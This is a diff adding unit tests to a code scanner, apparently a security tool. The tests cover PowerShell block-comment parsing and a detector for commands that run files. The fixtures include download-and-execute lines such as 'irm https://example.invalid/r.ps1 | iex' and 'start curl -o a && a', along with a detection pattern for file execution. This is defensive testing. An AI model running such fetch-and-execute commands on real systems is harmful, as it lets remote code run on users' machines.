@@ -110,3 +110,49 @@ class TestBundledVulnerabilities:
             encoding="utf-8",
         )
         assert "high" in self.severities(tmp_path, "lodash")
+
+
+class TestPowerShellBlockComments:
+    """`<# ... #>` is PowerShell's block comment: a script's help and usage live there."""
+
+    def test_the_block_is_a_comment_and_what_follows_is_code(self) -> None:
+        from cordon_scanner.core.comments import SourceComments
+
+        text = (
+            "<#\n  Usage:\n    irm https://example.invalid/r.ps1 | iex\n#>\nWrite-Output 'done'\n"
+        )
+        spans = SourceComments.block_comment_spans(text, "powershell")
+        assert spans == ((0, text.index("#>") + 2),)
+        assert not SourceComments.inside_spans(spans, text.index("Write-Output"))
+
+    def test_an_opener_inside_a_string_opens_nothing(self) -> None:
+        from cordon_scanner.core.comments import SourceComments
+
+        text = "$s = '<# not a comment'\nirm https://example.invalid/x | iex\n"
+        assert SourceComments.block_comment_spans(text, "powershell") == ()
+
+    def test_c_family_blocks_are_unchanged(self) -> None:
+        from cordon_scanner.core.comments import SourceComments
+
+        text = "/* a */ x();"
+        assert SourceComments.block_comment_spans(text, "javascript") == ((0, 7),)
+        assert SourceComments.block_comment_spans("<# a #>", "javascript") == ()
+
+
+class TestWhatCountsAsRunningAFile:
+    """`start` runs a file, or opens a link in the browser."""
+
+    def test_opening_a_link_is_not_running_a_file(self) -> None:
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        runs = CapabilityDetector._RUNS_A_FILE
+        assert runs.search('`start "" "${extUrl}"`') is None
+        assert runs.search("'start https://example.invalid/docs'") is None
+
+    def test_starting_a_file_still_is(self) -> None:
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        runs = CapabilityDetector._RUNS_A_FILE
+        assert runs.search('`start "" "${tmp}"`') is not None
+        assert runs.search("'start curl -o a && a'") is not None
+        assert runs.search('"sh ./payload.sh"') is not None
